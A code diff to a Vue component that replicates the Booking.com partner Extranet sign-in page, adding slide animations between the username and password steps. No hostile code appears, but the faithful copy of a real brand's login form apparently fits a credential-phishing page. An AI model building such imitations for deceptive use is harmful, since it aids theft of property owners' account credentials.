@@ -132,170 +132,175 @@
       class="flex flex-col items-center min-h-[calc(100vh-64px)] lg:mt-12 px-4 pt-4"
     >
       <div class="w-full max-w-[400px]">
-        <!-- Step 1: Username -->
-        <div v-if="step === 1" class="flex flex-col justify-center gap-y-4">
-          <h1 class="text-xl font-bold text-gray-900 mb-[13.4px]">
-            Sign in to manage your property
-          </h1>
-
-          <form @submit.prevent="nextStep">
-            <div class="mb-4">
-              <label
-                for="username"
-                class="block text-sm font-medium text-gray-900 pb-1"
-              >
-                Username
-              </label>
-              <input
-                id="username"
-                v-model="username"
-                type="text"
-                placeholder='Also known as "Login name" and "Login ID"'
-                class="w-full h-[36px] px-2 py-1 border border-gray-400 rounded-sm text-sm focus:border-[#006CE4] focus:outline-none focus:ring-1 focus:ring-[#006CE4] focus:ring-opacity-20"
-                required
-              />
-            </div>
-
-            <button
-              type="submit"
-              class="w-full bg-[#006ce4] hover:bg-[#00519e] text-white font-medium py-3 px-4 rounded text-base transition-colors duration-150"
-            >
-              Next
-            </button>
-          </form>
-
-          <div class="text-center mb-0 mt-4">
-            <button
-              @click="handleDefaultLink"
-              class="text-[#0071c2] w-full px-4 py-2 rounded hover:bg-slate-100 hover:bg-opacity-20 text-sm font-medium transition-colors duration-300"
-            >
-              Having trouble signing in?
-            </button>
-          </div>
-
-          <div class="mt-6 flex flex-col">
-            <hr class="border-gray-200 mb-4" />
-            <p class="text-xs text-gray-700">
-              Questions about your property or the Extranet? Check out
-              <button
-                @click="handleDefaultLink"
-                class="text-[#0071c2] hover:underline"
-              >
-                Partner Help
-              </button>
-              or<br />
-              ask another partner in the
-              <button
-                @click="handleDefaultLink"
-                class="text-[#0071c2] hover:underline"
-              >
-                Partner Community</button
-              >.
-            </p>
-          </div>
-
-          <button
-            class="w-full h-12 px-3 flex items-center justify-center bg-white hover:bg-gray-50 text-[#0071c2] font-medium rounded border border-[#0071c2] transition-colors duration-150"
+        <Transition :name="stepTransitionName" mode="out-in">
+          <!-- Step 1: Username -->
+          <div
+            v-if="step === 1"
+            key="step-1"
+            class="flex flex-col justify-center gap-y-4"
           >
-            Create your partner account
-          </button>
-        </div>
-
-        <!-- Step 2: Password -->
-        <div v-else-if="step === 2" class="flex flex-col gap-4">
-          <div>
             <h1 class="text-xl font-bold text-gray-900 mb-[13.4px]">
-              Enter your password
+              Sign in to manage your property
             </h1>
-            <p class="text-sm text-gray-700">
-              Enter your Booking.com password for
-              <span class="font-bold">{{ username }}</span
-              >.
-            </p>
-          </div>
 
-          <form @submit.prevent="signIn">
-            <div class="mb-4">
-              <label
-                for="password"
-                class="block text-sm font-medium text-gray-900 mb-1"
-              >
-                Password
-              </label>
-              <div class="relative h-[36px]">
+            <form @submit.prevent="nextStep">
+              <div class="mb-4">
+                <label
+                  for="username"
+                  class="block text-sm font-medium text-gray-900 pb-1"
+                >
+                  Username
+                </label>
                 <input
-                  id="password"
-                  v-model="password"
-                  :type="showPassword ? 'text' : 'password'"
-                  placeholder="Enter your password"
-                  class="w-full h-full px-2 py-1 pr-14 border border-gray-400 rounded-sm text-sm focus:border-[#006CE4] focus:outline-none focus:ring-1 focus:ring-[#006CE4] focus:ring-opacity-20"
+                  id="username"
+                  v-model="username"
+                  type="text"
+                  placeholder='Also known as "Login name" and "Login ID"'
+                  class="w-full h-[36px] px-2 py-1 border border-gray-400 rounded-sm text-sm focus:border-[#006CE4] focus:outline-none focus:ring-1 focus:ring-[#006CE4] focus:ring-opacity-20"
                   required
                 />
-                <div
-                  class="absolute right-2 top-1/2 transform -translate-y-1/2 flex items-center"
-                >
-                  <button
-                    type="button"
-                    @click="showPassword = !showPassword"
-                    class="p-1.5 text-gray-600 hover:text-gray-800"
-                  >
-                    <svg
-                      v-if="!showPassword"
-                      class="w-5 h-5"
-                      fill="none"
-                      stroke="currentColor"
-                      viewBox="0 0 24 24"
-                    >
-                      <path
-                        stroke-linecap="round"
-                        stroke-linejoin="round"
-                        stroke-width="2"
-                        d="M15 12a3 3 0 11-6 0 3 3 0 016 0z"
-                      />
-                      <path
-                        stroke-linecap="round"
-                        stroke-linejoin="round"
-                        stroke-width="2"
-                        d="M2.458 12C3.732 7.943 7.523 5 12 5c4.478 0 8.268 2.943 9.542 7-1.274 4.057-5.064 7-9.542 7-4.477 0-8.268-2.943-9.542-7z"
-                      />
-                    </svg>
-                    <svg
-                      v-else
-                      class="w-5 h-5"
-                      fill="none"
-                      stroke="currentColor"
-                      viewBox="0 0 24 24"
-                    >
-                      <path
-                        stroke-linecap="round"
-                        stroke-linejoin="round"
-                        stroke-width="2"
-                        d="M13.875 18.825A10.05 10.05 0 0112 19c-4.478 0-8.268-2.943-9.543-7a9.97 9.97 0 011.563-3.029m5.858.908a3 3 0 114.243 4.243M9.878 9.878l4.242 4.242M9.88 9.88l-3.29-3.29m7.532 7.532l3.29 3.29M3 3l3.59 3.59m0 0A9.953 9.953 0 0112 5c4.478 0 8.268 2.943 9.543 7a10.025 10.025 0 01-4.132 5.411m0 0L21 21"
-                      />
-                    </svg>
-                  </button>
-                </div>
               </div>
+
+              <button
+                type="submit"
+                class="w-full bg-[#006ce4] hover:bg-[#00519e] text-white font-medium py-3 px-4 rounded text-base transition-colors duration-150"
+              >
+                Next
+              </button>
+            </form>
+
+            <div class="text-center mb-0 mt-4">
+              <button
+                @click="handleDefaultLink"
+                class="text-[#0071c2] w-full px-4 py-2 rounded hover:bg-slate-100 hover:bg-opacity-20 text-sm font-medium transition-colors duration-300"
+              >
+                Having trouble signing in?
+              </button>
+            </div>
+
+            <div class="mt-6 flex flex-col">
+              <hr class="border-gray-200 mb-4" />
+              <p class="text-xs text-gray-700">
+                Questions about your property or the Extranet? Check out
+                <button
+                  @click="handleDefaultLink"
+                  class="text-[#0071c2] hover:underline"
+                >
+                  Partner Help
+                </button>
+                or<br />
+                ask another partner in the
+                <button
+                  @click="handleDefaultLink"
+                  class="text-[#0071c2] hover:underline"
+                >
+                  Partner Community</button
+                >.
+              </p>
             </div>
 
             <button
-              type="submit"
-              class="w-full bg-[#006ce4] hover:bg-[#00449e] text-white font-medium py-3 px-4 rounded text-base transition-colors duration-150"
+              class="w-full h-12 px-3 flex items-center justify-center bg-white hover:bg-gray-50 text-[#0071c2] font-medium rounded border border-[#0071c2] transition-colors duration-150"
             >
-              Sign in
-            </button>
-          </form>
-
-          <div class="text-center">
-            <button
-              @click="handleDefaultLink"
-              class="text-[#006ce4] w-full px-4 py-2 rounded hover:bg-slate-100 hover:bg-opacity-20 text-sm font-medium transition-colors duration-300"
-            >
-              Forgot your password?
+              Create your partner account
             </button>
           </div>
-        </div>
 
+          <!-- Step 2: Password -->
+          <div v-else-if="step === 2" class="flex flex-col gap-4">
+            <div>
+              <h1 class="text-xl font-bold text-gray-900 mb-[13.4px]">
+                Enter your password
+              </h1>
+              <p class="text-sm text-gray-700">
+                Enter your Booking.com password for
+                <span class="font-bold">{{ username }}</span
+                >.
+              </p>
+            </div>
+
+            <form @submit.prevent="signIn">
+              <div class="mb-4">
+                <label
+                  for="password"
+                  class="block text-sm font-medium text-gray-900 mb-1"
+                >
+                  Password
+                </label>
+                <div class="relative h-[36px]">
+                  <input
+                    id="password"
+                    v-model="password"
+                    :type="showPassword ? 'text' : 'password'"
+                    placeholder="Enter your password"
+                    class="w-full h-full px-2 py-1 pr-14 border border-gray-400 rounded-sm text-sm focus:border-[#006CE4] focus:outline-none focus:ring-1 focus:ring-[#006CE4] focus:ring-opacity-20"
+                    required
+                  />
+                  <div
+                    class="absolute right-2 top-1/2 transform -translate-y-1/2 flex items-center"
+                  >
+                    <button
+                      type="button"
+                      @click="showPassword = !showPassword"
+                      class="p-1.5 text-gray-600 hover:text-gray-800"
+                    >
+                      <svg
+                        v-if="!showPassword"
+                        class="w-5 h-5"
+                        fill="none"
+                        stroke="currentColor"
+                        viewBox="0 0 24 24"
+                      >
+                        <path
+                          stroke-linecap="round"
+                          stroke-linejoin="round"
+                          stroke-width="2"
+                          d="M15 12a3 3 0 11-6 0 3 3 0 016 0z"
+                        />
+                        <path
+                          stroke-linecap="round"
+                          stroke-linejoin="round"
+                          stroke-width="2"
+                          d="M2.458 12C3.732 7.943 7.523 5 12 5c4.478 0 8.268 2.943 9.542 7-1.274 4.057-5.064 7-9.542 7-4.477 0-8.268-2.943-9.542-7z"
+                        />
+                      </svg>
+                      <svg
+                        v-else
+                        class="w-5 h-5"
+                        fill="none"
+                        stroke="currentColor"
+                        viewBox="0 0 24 24"
+                      >
+                        <path
+                          stroke-linecap="round"
+                          stroke-linejoin="round"
+                          stroke-width="2"
+                          d="M13.875 18.825A10.05 10.05 0 0112 19c-4.478 0-8.268-2.943-9.543-7a9.97 9.97 0 011.563-3.029m5.858.908a3 3 0 114.243 4.243M9.878 9.878l4.242 4.242M9.88 9.88l-3.29-3.29m7.532 7.532l3.29 3.29M3 3l3.59 3.59m0 0A9.953 9.953 0 0112 5c4.478 0 8.268 2.943 9.543 7a10.025 10.025 0 01-4.132 5.411m0 0L21 21"
+                        />
+                      </svg>
+                    </button>
+                  </div>
+                </div>
+              </div>
+
+              <button
+                type="submit"
+                class="w-full bg-[#006ce4] hover:bg-[#00449e] text-white font-medium py-3 px-4 rounded text-base transition-colors duration-150"
+              >
+                Sign in
+              </button>
+            </form>
+
+            <div class="text-center">
+              <button
+                @click="handleDefaultLink"
+                class="text-[#006ce4] w-full px-4 py-2 rounded hover:bg-slate-100 hover:bg-opacity-20 text-sm font-medium transition-colors duration-300"
+              >
+                Forgot your password?
+              </button>
+            </div>
+          </div>
+        </Transition>
         <div class="py-4">
           <div
             class="text-center text-[12px] text-gray-600 pt-4 border-t border-gray-200 flex flex-col gap-2"
@@ -338,6 +343,7 @@ const username = ref('');
 const password = ref('');
 const showPassword = ref(false);
 const isMenuOpen = ref(false);
+const stepTransitionName = ref('slide-left');
 
 useHead({
   title: 'Sign in - Booking.com',
@@ -360,6 +366,7 @@ function toggleMenu() {
 
 function nextStep() {
   if (username.value) {
+    stepTransitionName.value = 'slide-left';
     step.value = 2;
   }
 }
@@ -406,5 +413,26 @@ a {
 .slide-up-enter-from,
 .slide-up-leave-to {
   transform: translateY(100%);
+}
+
+/* Step transitions */
+.slide-left-enter-active,
+.slide-left-leave-active,
+.slide-right-enter-active,
+.slide-right-leave-active {
+  transition: transform 300ms cubic-bezier(0.4, 0, 0.2, 1),
+    opacity 300ms cubic-bezier(0.4, 0, 0.2, 1);
+}
+
+.slide-left-enter-from,
+.slide-right-leave-to {
+  transform: translateX(100%);
+  opacity: 0;
+}
+
+.slide-left-leave-to,
+.slide-right-enter-from {
+  transform: translateX(-100%);
+  opacity: 0;
 }
 </style>
